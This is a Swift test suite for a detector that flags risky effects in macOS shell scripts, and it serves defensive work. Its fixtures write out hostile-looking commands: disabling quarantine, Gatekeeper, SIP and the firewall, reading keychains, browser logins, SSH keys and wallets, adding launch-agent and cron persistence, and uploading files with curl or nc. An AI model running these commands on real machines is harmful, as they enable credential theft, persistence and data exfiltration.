import Foundation
import Testing
import PreviewContracts
@testable import PreviewFormats

// The other seven effects in shell scripts. Fixtures are synthetic; no path names a real account.

@Suite("Script effects: quarantine and protection (shell)")
struct ScriptEffectsProtectionTests {
    static let quarantine: [ScriptCase] = [
        ScriptCase("xattr -d", "xattr -d com.apple.quarantine /Applications/Example.app\n", [.quarantine()]),
        ScriptCase("xattr -dr", "xattr -dr com.apple.quarantine /Applications/Example.app\n", [.quarantine()]),
        ScriptCase("xattr -rd", "xattr -rd com.apple.quarantine ~/Downloads/example\n", [.quarantine()]),
        ScriptCase("xattr -r -d separate", "xattr -r -d com.apple.quarantine ~/Downloads/example\n", [.quarantine()]),
        ScriptCase("xattr -c clears everything", "xattr -c ~/Downloads/example.dmg\n", [.quarantine()]),
        ScriptCase("xattr -cr", "xattr -cr /Applications/Example.app\n", [.quarantine()]),
        ScriptCase("xattr -rc", "xattr -rc /Applications/Example.app\n", [.quarantine()]),
        ScriptCase("through sudo", "sudo xattr -dr com.apple.quarantine /Applications/Example.app\n", [.quarantine(), .elevates()]),
        ScriptCase("quoted attribute name", "xattr -d 'com.apple.quarantine' \"$APP\"\n", [.quarantine()]),
        ScriptCase("LSQuarantine -bool NO", "defaults write com.apple.LaunchServices LSQuarantine -bool NO\n", [.quarantine()]),
        ScriptCase("LSQuarantine -bool false", "defaults write com.apple.LaunchServices LSQuarantine -bool false\n", [.quarantine()]),
        ScriptCase("LSQuarantine without a type", "defaults write com.apple.LaunchServices LSQuarantine NO\n", [.quarantine()]),
        ScriptCase("on the right lines", "echo start\nxattr -cr app\necho middle\nxattr -d com.apple.quarantine app\n", [.quarantine(2, at: [2, 4])])
    ]

    @Test(arguments: quarantine) func reportsRemovedQuarantine(_ scenario: ScriptCase) throws { try scenario.check() }

    static let quarantineNearMisses: [ScriptCase] = [
        ScriptCase("xattr -l lists", "xattr -l file\n"),
        ScriptCase("xattr -p reads one", "xattr -p com.apple.quarantine file\n"),
        ScriptCase("xattr -w writes one", "xattr -w com.apple.quarantine '0081;00000000;Safari;' file\n"),
        ScriptCase("xattr -d of another attribute", "xattr -d com.apple.FinderInfo file\n"),
        ScriptCase("xattr -lr", "xattr -lr file\n"),
        ScriptCase("quarantine back on", "defaults write com.apple.LaunchServices LSQuarantine -bool YES\n"),
        ScriptCase("quarantine read", "defaults read com.apple.LaunchServices LSQuarantine\n"),
        ScriptCase("other defaults write", "defaults write com.apple.finder AppleShowAllFiles -bool NO\n"),
        ScriptCase("message", "echo \"run: xattr -d com.apple.quarantine app\"\n"),
        ScriptCase("comment", "# xattr -cr app\n")
    ]

    @Test(arguments: quarantineNearMisses) func quarantineStaysSilent(_ scenario: ScriptCase) throws { try scenario.check() }

    static let protection: [ScriptCase] = [
        ScriptCase("spctl --master-disable", "spctl --master-disable\n", [.protection()]),
        ScriptCase("spctl --global-disable", "spctl --global-disable\n", [.protection()]),
        ScriptCase("spctl --disable", "spctl --disable\n", [.protection()]),
        ScriptCase("through sudo", "sudo spctl --master-disable\n", [.protection(), .elevates()]),
        ScriptCase("csrutil disable", "csrutil disable\n", [.protection()]),
        ScriptCase("csrutil authenticated-root disable", "csrutil authenticated-root disable\n", [.protection()]),
        ScriptCase("socketfilterfw off", "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off\n", [.protection()]),
        ScriptCase("two on separate lines", "csrutil disable\necho ok\nspctl --master-disable\n", [.protection(2, at: [1, 3])])
    ]

    @Test(arguments: protection) func reportsDisabledProtection(_ scenario: ScriptCase) throws { try scenario.check() }

    static let protectionNearMisses: [ScriptCase] = [
        ScriptCase("spctl status", "spctl --status\n"),
        ScriptCase("spctl assess", "spctl --assess --verbose /Applications/Example.app\n"),
        ScriptCase("spctl enable", "spctl --master-enable\n"),
        ScriptCase("csrutil status", "csrutil status\n"),
        ScriptCase("firewall on", "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on\n"),
        ScriptCase("firewall state", "/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n"),
        ScriptCase("message", "echo \"Disable SIP with: csrutil disable\"\n"),
        ScriptCase("comment", "# spctl --master-disable\n")
    ]

    @Test(arguments: protectionNearMisses) func protectionStaysSilent(_ scenario: ScriptCase) throws { try scenario.check() }
}

@Suite("Script effects: passwords and secrets (shell)")
struct ScriptEffectsSecretTests {
    static let passwords: [ScriptCase] = [
        ScriptCase("sudo -S", "echo \"$PASSWORD\" | sudo -S ls\n", [.password(), .elevates()]),
        ScriptCase("sudo -S -v", "printf '%s\\n' \"$PASSWORD\" | sudo -S -v\n", [.password(), .elevates()]),
        ScriptCase("sudo -kS", "echo x | sudo -kS ls\n", [.password(), .elevates()]),
        ScriptCase("sudo --stdin", "echo x | sudo --stdin ls\n", [.password(), .elevates()]),
        ScriptCase("dscl -authonly", "dscl . -authonly \"$USER\" \"$PASSWORD\"\n", [.password()]),
        ScriptCase("unlock-keychain -p", "security unlock-keychain -p \"$PASSWORD\"\n", [.password()])
    ]

    @Test(arguments: passwords) func reportsPasswordRequests(_ scenario: ScriptCase) throws { try scenario.check() }

    static let passwordNearMisses: [ScriptCase] = [
        ScriptCase("plain sudo", "sudo ls\n", [.elevates()]),
        ScriptCase("sudo -n", "sudo -n true\n", [.elevates()]),
        ScriptCase("dscl read", "dscl . -read /Users/example\n"),
        ScriptCase("unlock-keychain without a password", "security unlock-keychain\n"),
        ScriptCase("list-keychains", "security list-keychains\n"),
        ScriptCase("message", "echo \"use sudo -S to read from stdin\"\n"),
        ScriptCase("read -s", "read -s -p 'Passphrase: ' PASS\n")
    ]

    @Test(arguments: passwordNearMisses) func passwordsStaySilent(_ scenario: ScriptCase) throws { try scenario.check() }

    static let secrets: [ScriptCase] = [
        ScriptCase("generic password", "security find-generic-password -ga \"Example Safe Storage\"\n", [.secrets()]),
        ScriptCase("internet password", "security find-internet-password -s example.com -w\n", [.secrets()]),
        ScriptCase("dump-keychain", "security dump-keychain -d\n", [.secrets()]),
        ScriptCase("export from a keychain", "security export -k login.keychain -t identities -f pkcs12 -o /tmp/ids.p12\n", [.secrets()]),
        ScriptCase("Chrome Login Data", "cp \"$HOME/Library/Application Support/Google/Chrome/Default/Login Data\" /tmp/ld\n", [.secrets()]),
        ScriptCase("Brave Login Data", "cp ~/Library/Application\\ Support/BraveSoftware/Brave-Browser/Default/Login\\ Data /tmp/ld\n", [.secrets()]),
        ScriptCase("Edge Login Data", "cp \"$HOME/Library/Application Support/Microsoft Edge/Default/Login Data\" /tmp/ld\n", [.secrets()]),
        ScriptCase("Chrome cookies", "cp \"$HOME/Library/Application Support/Google/Chrome/Default/Cookies\" /tmp/c\n", [.secrets()]),
        ScriptCase("Chromium Local State", "cp \"$HOME/Library/Application Support/Chromium/Local State\" /tmp/ls\n", [.secrets()]),
        ScriptCase("Firefox logins.json", "cp ~/Library/Application\\ Support/Firefox/Profiles/example.default/logins.json /tmp/\n", [.secrets()]),
        ScriptCase("Firefox key4.db", "cp ~/Library/Application\\ Support/Firefox/Profiles/example.default/key4.db /tmp/\n", [.secrets()]),
        ScriptCase("Safari cookies", "cp ~/Library/Cookies/Cookies.binarycookies /tmp/\n", [.secrets()]),
        ScriptCase("keychains folder", "ls ~/Library/Keychains\n", [.secrets()]),
        ScriptCase("keychain file", "cp ~/Library/Keychains/login.keychain-db /tmp/\n", [.secrets()]),
        ScriptCase("SSH private key", "cat ~/.ssh/id_rsa\n", [.secrets()]),
        ScriptCase("SSH ed25519 key copied", "cp \"$HOME/.ssh/id_ed25519\" /tmp/k\n", [.secrets()]),
        ScriptCase("AWS credentials", "cat ~/.aws/credentials\n", [.secrets()]),
        ScriptCase("Exodus wallet", "cp -R \"$HOME/Library/Application Support/Exodus\" /tmp/w\n", [.secrets()]),
        ScriptCase("Electrum wallet", "cp ~/.electrum/wallets/default_wallet /tmp/w\n", [.secrets()]),
        ScriptCase("Atomic wallet", "cp -R \"$HOME/Library/Application Support/atomic/Local Storage\" /tmp/w\n", [.secrets()]),
        ScriptCase("Coinomi wallet", "cp -R \"$HOME/Library/Application Support/Coinomi\" /tmp/w\n", [.secrets()]),
        ScriptCase("MetaMask extension", "cp -R \"Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\" /tmp/m\n", [.secrets()]),
        ScriptCase("TCC database", "cp \"/Library/Application Support/com.apple.TCC/TCC.db\" /tmp/\n", [.secrets()]),
        ScriptCase("path read through input redirection", "base64 < ~/.ssh/id_rsa\n", [.secrets()]),
        ScriptCase("path in a variable assignment", "STORE=\"$HOME/Library/Application Support/Google/Chrome/Default/Login Data\"\n", [.secrets()]),
        ScriptCase("one occurrence per line", "cp ~/.ssh/id_rsa ~/.aws/credentials /tmp/\n", [.secrets()]),
        ScriptCase("one per line, two lines", "cat ~/.ssh/id_rsa\necho ok\ncat ~/.aws/credentials\n", [.secrets(2, at: [1, 3])]),
        ScriptCase("inside a substitution", "KEY=$(cat ~/.ssh/id_rsa)\n", [.secrets()])
    ]

    @Test(arguments: secrets) func reportsSecretReads(_ scenario: ScriptCase) throws { try scenario.check() }

    static let secretNearMisses: [ScriptCase] = [
        ScriptCase("ssh-keygen", "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519\n"),
        ScriptCase("ssh -i", "ssh -i ~/.ssh/id_rsa host\n"),
        ScriptCase("ssh-add", "ssh-add ~/.ssh/id_rsa\n"),
        ScriptCase("scp -i", "scp -i ~/.ssh/id_rsa file host:\n"),
        ScriptCase("public key", "cat ~/.ssh/id_rsa.pub\n"),
        ScriptCase("ssh config", "cat ~/.ssh/config\n"),
        ScriptCase("known hosts", "cat ~/.ssh/known_hosts\n"),
        ScriptCase("message naming a key", "echo \"Your key is in ~/.ssh/id_rsa\"\n"),
        ScriptCase("printf naming credentials", "printf 'Edit ~/.aws/credentials first\\n'\n"),
        ScriptCase("existence test", "[ -f ~/.ssh/id_rsa ] && echo yes\n"),
        ScriptCase("weak path in an assignment", "KEY=~/.ssh/id_rsa\n"),
        ScriptCase("browser bookmarks", "ls \"$HOME/Library/Application Support/Google/Chrome/Default/Bookmarks\"\n"),
        ScriptCase("cookies.txt for curl", "curl -b cookies.txt https://example.com\n"),
        ScriptCase("the words login data", "echo 'Login Data'\n"),
        ScriptCase("a prompt about login data", "read -p 'Enter login data: ' X\n"),
        ScriptCase("atomic in a build path", "g++ -I/usr/include/c++/v1/atomic main.cc\n"),
        ScriptCase("AWS profile name", "export AWS_PROFILE=dev\n"),
        ScriptCase("comment", "# cat ~/.ssh/id_rsa\n"),
        ScriptCase("security list", "security find-identity -v -p codesigning\n"),
        ScriptCase("chmod on one's own key", "chmod 600 ~/.ssh/id_rsa\n"),
        ScriptCase("ls of one's own key", "ls -la ~/.ssh/id_rsa\n"),
        ScriptCase("code-signing keychain setup", "security create-keychain -p example build.keychain\nsecurity import cert.p12 -k build.keychain\nsecurity set-keychain-settings -t 3600 build.keychain\n"),
        ScriptCase("keychain import by path", "security import cert.p12 -k \"$HOME/Library/Keychains/build.keychain-db\"\n")
    ]

    @Test(arguments: secretNearMisses) func secretsStaySilent(_ scenario: ScriptCase) throws { try scenario.check() }
}

@Suite("Script effects: persistence, elevation and uploads (shell)")
struct ScriptEffectsReachTests {
    static let persistence: [ScriptCase] = [
        ScriptCase("copy into LaunchAgents", "cp com.example.plist ~/Library/LaunchAgents/\n", [.persistence()]),
        ScriptCase("copy into LaunchDaemons", "sudo cp com.example.plist /Library/LaunchDaemons/\n", [.persistence(), .elevates()]),
        ScriptCase("redirect into LaunchAgents", "echo '<plist/>' > \"$HOME/Library/LaunchAgents/com.example.plist\"\n", [.persistence()]),
        ScriptCase("tee into LaunchDaemons", "echo x | tee /Library/LaunchDaemons/com.example.plist\n", [.persistence()]),
        ScriptCase("defaults write into LaunchAgents", "defaults write ~/Library/LaunchAgents/com.example RunAtLoad -bool true\n", [.persistence()]),
        ScriptCase("launchctl load", "launchctl load -w ~/Library/LaunchAgents/com.example.plist\n", [.persistence()]),
        ScriptCase("launchctl bootstrap", "launchctl bootstrap gui/501 com.example.plist\n", [.persistence()]),
        ScriptCase("launchctl enable", "launchctl enable gui/501/com.example\n", [.persistence()]),
        ScriptCase("launchctl submit", "launchctl submit -l com.example -- /bin/sh\n", [.persistence()]),
        ScriptCase("crontab from a file", "crontab mycron\n", [.persistence()]),
        ScriptCase("crontab from stdin", "echo '* * * * * /tmp/x' | crontab -\n", [.persistence()]),
        ScriptCase("append to .zshrc", "echo 'export PATH=$PATH:~/bin' >> ~/.zshrc\n", [.persistence()]),
        ScriptCase("append to .zprofile", "echo 'eval \"$(x)\"' >> $HOME/.zprofile\n", [.persistence()]),
        ScriptCase("append to .bash_profile", "echo 'x' >> ~/.bash_profile\n", [.persistence()]),
        ScriptCase("append to .bashrc", "echo 'x' >> \"$HOME/.bashrc\"\n", [.persistence()]),
        ScriptCase("append to .profile", "echo 'x' >> ~/.profile\n", [.persistence()]),
        ScriptCase("append through a here-document", "cat >> ~/.zshrc <<'EOT'\nexport EXAMPLE=1\nEOT\n", [.persistence()]),
        ScriptCase("tee -a", "echo 'x' | tee -a ~/.zshrc\n", [.persistence()]),
        ScriptCase("a script's own sequence", "echo a\ncp x ~/Library/LaunchAgents/\necho b\nlaunchctl load ~/x\n", [.persistence(2, at: [2, 4])])
    ]

    @Test(arguments: persistence) func reportsPersistence(_ scenario: ScriptCase) throws { try scenario.check() }

    static let persistenceNearMisses: [ScriptCase] = [
        ScriptCase("launchctl list", "launchctl list\n"),
        ScriptCase("launchctl unload", "launchctl unload ~/Library/LaunchAgents/com.example.plist\n"),
        ScriptCase("launchctl print", "launchctl print gui/501\n"),
        ScriptCase("launchctl kickstart", "launchctl kickstart -k gui/501/com.example\n"),
        ScriptCase("crontab -l", "crontab -l\n"),
        ScriptCase("crontab -r", "crontab -r\n"),
        ScriptCase("crontab -l piped", "crontab -l | grep example\n"),
        ScriptCase("overwrite rather than append", "echo hi > ~/.zshrc\n"),
        ScriptCase("read a startup file", "cat ~/.zshrc\n"),
        ScriptCase("source a startup file", "source ~/.zshrc\n"),
        ScriptCase("append to another file", "echo hi >> ~/notes.txt\n"),
        ScriptCase("helper job packaged inside an app", "cp helper.plist \"$APP/Contents/Library/LaunchAgents/\"\n"),
        ScriptCase("list LaunchAgents", "ls ~/Library/LaunchAgents\n"),
        ScriptCase("make the folder", "mkdir -p ~/Library/LaunchAgents\n"),
        ScriptCase("lint a plist", "plutil -lint ~/Library/LaunchAgents/com.example.plist\n"),
        ScriptCase("remove a plist", "rm ~/Library/LaunchAgents/com.example.plist\n"),
        ScriptCase("message", "echo \"add this to ~/.zshrc\"\n"),
        ScriptCase("comment", "# cp x ~/Library/LaunchAgents/\n")
    ]

    @Test(arguments: persistenceNearMisses) func persistenceStaysSilent(_ scenario: ScriptCase) throws { try scenario.check() }

    static let elevation: [ScriptCase] = [
        ScriptCase("sudo as a command", "sudo make install\n", [.elevates()]),
        ScriptCase("sudo with a user", "sudo -u root ls\n", [.elevates()]),
        ScriptCase("sudo after env", "env FOO=1 sudo ls\n", [.elevates()]),
        ScriptCase("sudo after exec", "exec sudo \"$0\" \"$@\"\n", [.elevates()]),
        ScriptCase("sudo in a conditional", "if [ \"$(id -u)\" -ne 0 ]; then sudo \"$0\"; fi\n", [.elevates()]),
        ScriptCase("sudo in a function", "install() {\n  sudo cp a /usr/local/bin\n}\n", [.elevates(1, at: [2])]),
        ScriptCase("sudo in a case branch", "case \"$1\" in\n  start) sudo systemctl start x ;;\nesac\n", [.elevates(1, at: [2])]),
        ScriptCase("two on one line", "sudo a; sudo b && sudo c\n", [.elevates(3)]),
        ScriptCase("quoted sudo as the command", "\"sudo\" ls\n", [.elevates()]),
        ScriptCase("after a pipe", "echo x | sudo tee /etc/example\n", [.elevates()]),
        ScriptCase("in a substitution", "OUT=$(sudo ls /root)\n", [.elevates()]),
        ScriptCase("inside sh -c", "bash -c 'sudo launchctl list'\n", [.elevates()]),
        ScriptCase("after a line continuation", "echo start && \\\n  sudo make\n", [.elevates()])
    ]

    @Test(arguments: elevation) func reportsElevation(_ scenario: ScriptCase) throws { try scenario.check() }

    static let elevationNearMisses: [ScriptCase] = [
        ScriptCase("in an echo", "echo \"run this with sudo\"\n"),
        ScriptCase("in a single-quoted message", "echo 'sudo is required'\n"),
        ScriptCase("SUDO_USER", "echo \"$SUDO_USER\"\n"),
        ScriptCase("SUDO_USER test", "if [ -n \"$SUDO_USER\" ]; then HOME_DIR=$(eval echo ~$SUDO_USER); fi\n"),
        ScriptCase("SUDO_ASKPASS", "export SUDO_ASKPASS=/usr/local/bin/askpass\n"),
        ScriptCase("assignment", "SUDO=sudo\n"),
        ScriptCase("alias", "alias please=sudo\n"),
        ScriptCase("command -v", "command -v sudo >/dev/null\n"),
        ScriptCase("type", "type sudo\n"),
        ScriptCase("which", "which sudo\n"),
        ScriptCase("grep", "grep sudo /etc/group\n"),
        ScriptCase("man", "man sudo\n"),
        ScriptCase("printf", "printf 'try: sudo make install\\n'\n"),
        ScriptCase("multi-line message", "echo \"first line\nsudo second line\"\n"),
        ScriptCase("comment", "# sudo make install\n"),
        ScriptCase("trailing comment", "make # then sudo make install\n"),
        ScriptCase("here-document text", "cat <<EOF\nsudo make install\nEOF\n"),
        ScriptCase("word containing sudo", "visudo -c\n")
    ]

    @Test(arguments: elevationNearMisses) func elevationStaysSilent(_ scenario: ScriptCase) throws { try scenario.check() }

    static let uploads: [ScriptCase] = [
        ScriptCase("curl -F file", "curl -F \"file=@/tmp/archive.zip\" https://example.com/upload\n", [.uploads()]),
        ScriptCase("curl --form", "curl --form file=@archive.zip https://example.com/upload\n", [.uploads()]),
        ScriptCase("curl -d @file", "curl -d @data.json https://example.com/api\n", [.uploads()]),
        ScriptCase("curl --data @file", "curl --data @data.json https://example.com/api\n", [.uploads()]),
        ScriptCase("curl --data-binary @file", "curl --data-binary @archive.zip https://example.com/api\n", [.uploads()]),
        ScriptCase("curl -T", "curl -T report.txt ftp://example.com/\n", [.uploads()]),
        ScriptCase("curl --upload-file", "curl --upload-file report.txt https://example.com/up\n", [.uploads()]),
        ScriptCase("curl option cluster", "curl -sSX POST -F 'f=@a' https://example.com/up\n", [.uploads()]),
        ScriptCase("nc with a redirected file", "nc example.com 4444 < /tmp/secret.txt\n", [.uploads()]),
        ScriptCase("ncat with a redirected file", "ncat example.com 4444 < data.bin\n", [.uploads()]),
        ScriptCase("cat piped to nc", "cat data.bin | nc example.com 4444\n", [.uploads()]),
        ScriptCase("through sudo", "sudo curl -T a.txt https://example.com/up\n", [.elevates(), .uploads()])
    ]

    @Test(arguments: uploads) func reportsUploads(_ scenario: ScriptCase) throws { try scenario.check() }

    static let uploadNearMisses: [ScriptCase] = [
        ScriptCase("plain get", "curl https://example.com\n"),
        ScriptCase("literal data", "curl -d 'a=b' https://example.com/api\n"),
        ScriptCase("json data", "curl -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' https://example.com/api\n"),
        ScriptCase("form field without a file", "curl -F 'name=Example' https://example.com/api\n"),
        ScriptCase("form field with an address", "curl -F 'email=user@example.com' https://example.com/api\n"),
        ScriptCase("body from stdin", "curl -d @- https://example.com/api\n"),
        ScriptCase("data-raw is literal", "curl --data-raw @value https://example.com/api\n"),
        ScriptCase("upload from stdin", "curl -T - https://example.com/up\n"),
        ScriptCase("scp", "scp archive.zip host:/srv/\n"),
        ScriptCase("rsync", "rsync -a dir/ host:/srv/dir/\n"),
        ScriptCase("git push", "git push origin main\n"),
        ScriptCase("nc listening", "nc -l 4444 > out.bin\n"),
        ScriptCase("nc probe", "nc -z example.com 80\n"),
        ScriptCase("nc from /dev/null", "nc example.com 80 < /dev/null\n"),
        ScriptCase("comment", "# curl -F file=@a https://example.com\n")
    ]

    @Test(arguments: uploadNearMisses) func uploadsStaySilent(_ scenario: ScriptCase) throws { try scenario.check() }
}
